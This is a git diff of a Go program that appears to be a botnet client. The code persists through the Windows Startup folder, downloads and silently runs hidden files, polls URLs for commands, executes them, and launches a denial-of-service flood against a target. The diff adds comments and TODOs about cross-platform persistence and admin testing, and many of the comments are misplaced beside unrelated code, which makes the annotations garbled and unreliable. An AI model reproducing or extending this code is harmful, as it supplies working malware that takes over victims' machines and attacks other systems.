@@ -1,5 +1,14 @@
+// Package declaration
 package main
 
+// TODO: keep comments updated
+// TODO: add autostart for linux and darwin
+// TODO: do testing on linux
+// TODO: do testing on linux with admin privileges
+// TODO: do testing on darwin
+// TODO: do testing on darwin with admin privileges
+// TODO: do testing on windows
+// TODO: do testing on windows with admin privileges
 import (
 	"encoding/json"
 	"fmt"
@@ -7,21 +16,26 @@ import (
 	"io/ioutil"
 	"math/rand"
 	"net"
+	// Import statements to include necessary packages
 	"net/http"
 	"os"
+	// Function to check if the program is running with administrative privileges on Windows
 	"os/exec"
 	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
+	// Function to copy a file from a source path (src) to a destination path (dst)
 	"time"
 )
 
+// TODO: add linux and darwin support
 func isAdmin() (bool, error) {
 	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
 	if err != nil {
 		if strings.Contains(err.Error(), "Access is denied") {
 			return false, nil
+			// Function to copy the executable to the startup folder on Windows
 		}
 		return false, err
 	}
@@ -34,6 +48,7 @@ func copyFile(src, dst string) error {
 		return err
 	}
 
+	// Checks if the program is running with administrative privileges and sets the startup path accordingly
 	err = os.WriteFile(dst, input, 0644)
 	return err
 }
@@ -41,6 +56,7 @@ func copyFile(src, dst string) error {
 func copyToStartup(executablePath string) {
 	var startupPath string
 	admin, err := isAdmin()
+	// Copies the executable to the startup folder and prints the result
 	if err != nil {
 		fmt.Println("Error checking admin privileges:", err)
 		return
@@ -51,6 +67,7 @@ func copyToStartup(executablePath string) {
 	} else {
 		startupPath = filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
 	}
+	// Function to execute a shell script named "otherScript.sh"
 
 	destPath := filepath.Join(startupPath, filepath.Base(executablePath))
 
@@ -58,17 +75,20 @@ func copyToStartup(executablePath string) {
 	if err != nil {
 		fmt.Println("Error copying file:", err)
 	} else {
+		// Function to determine the OS and set the program to run at startup accordingly
 		fmt.Println("Successfully copied to startup folder:", destPath)
 	}
 }
 
 func executeOtherScript() {
 	cmd := exec.Command("/bin/sh", "otherScript.sh")
+	// Struct defining the configuration with URL and backup URLs
 	if err := cmd.Run(); err != nil {
 		fmt.Println("Error executing other script:", err)
 	} else {
 		fmt.Println("Successfully executed other script.")
 	}
+	// Function to download a file from a URL and optionally run or hide it after downloading
 }
 
 func runAtStartup() {
@@ -82,6 +102,7 @@ func runAtStartup() {
 	} else {
 		executeOtherScript()
 	}
+	// Checks the HTTP response and proceeds only if successful
 }
 
 type Config struct {
@@ -90,6 +111,7 @@ type Config struct {
 }
 
 func downloadFile(url, filename string, run, hide bool) error {
+	// Writes the downloaded content to a file
 	resp, err := http.Get(url)
 	if err != nil {
 		return err
@@ -98,6 +120,7 @@ func downloadFile(url, filename string, run, hide bool) error {
 
 	if resp.StatusCode != http.StatusOK {
 		return fmt.Errorf("HTTP request failed with status code %d", resp.StatusCode)
+		// Optionally hides the file on the filesystem
 	}
 
 	out, err := os.Create(filename)
@@ -108,6 +131,7 @@ func downloadFile(url, filename string, run, hide bool) error {
 
 	_, err = io.Copy(out, resp.Body)
 	if err != nil {
+		// Optionally runs the downloaded file
 		return err
 	}
 
@@ -120,6 +144,7 @@ func downloadFile(url, filename string, run, hide bool) error {
 		} else {
 			hiddenFilename := "." + filename
 			err := os.Rename(filename, hiddenFilename)
+			// Function to display a message in a temporary HTML file and open it in a browser
 			if err != nil {
 				return fmt.Errorf("failed to rename the file: %v", err)
 			}
@@ -134,6 +159,7 @@ func downloadFile(url, filename string, run, hide bool) error {
 			os.Chmod(filename, 0755)
 			cmd = exec.Command("./" + filename)
 		}
+		// Function to open the temporary HTML file in the default web browser
 		cmd.Run()
 	}
 
@@ -143,6 +169,7 @@ func downloadFile(url, filename string, run, hide bool) error {
 func displayMessageInHTML(message string) {
 
 	tmpfile, err := ioutil.TempFile("", "message-*.html")
+	// Function to load the configuration from a JSON file
 	if err != nil {
 		fmt.Printf("Error creating a temporary file: %s\n", err)
 		return
@@ -158,6 +185,7 @@ func displayMessageInHTML(message string) {
 	openBrowser(tmpfile.Name())
 }
 
+// Function to fetch a command from a list of URLs provided in the Config struct
 func openBrowser(url string) {
 	var err error
 
@@ -174,6 +202,7 @@ func openBrowser(url string) {
 
 	if err != nil {
 		fmt.Printf("Error opening browser: %s\n", err)
+		// Function to generate a random string of a specified length
 	}
 }
 
@@ -185,6 +214,7 @@ func LoadConfig(path string) (*Config, error) {
 	defer file.Close()
 
 	var config Config
+	// Function to perform a Denial of Service (DoS) attack on a specified target and port for a duration
 	decoder := json.NewDecoder(file)
 	err = decoder.Decode(&config)
 	if err != nil {
@@ -201,6 +231,7 @@ func FetchCommand(config *Config) (string, error) {
 		if err == nil && resp.StatusCode == http.StatusOK {
 			body, err := ioutil.ReadAll(resp.Body)
 			resp.Body.Close()
+			// Function to parse and execute commands received as strings
 			if err != nil {
 				continue
 			}
@@ -228,6 +259,7 @@ func DOS(target string, port string, duration time.Duration) {
 		if err != nil {
 			fmt.Println(err)
 			return
+			// Function to execute a system command with the provided name and arguments
 		}
 		defer conn.Close()
 
@@ -241,10 +273,13 @@ func DOS(target string, port string, duration time.Duration) {
 	for time.Now().Before(endTime) {
 		wg.Add(1)
 		go send()
+		// The main function, entry point of the program
 		time.Sleep(10 * time.Millisecond)
 	}
+	// Sets the seed for the random number generator
 
 	wg.Wait()
+	// Loads configuration from a file
 }
 
 func ParseCommand(command string) error {
@@ -252,6 +287,7 @@ func ParseCommand(command string) error {
 	for _, cmd := range commands {
 		parts := strings.Fields(cmd)
 		if len(parts) == 0 {
+			// Infinite loop to fetch and execute commands at a regular interval
 			continue
 		}
 
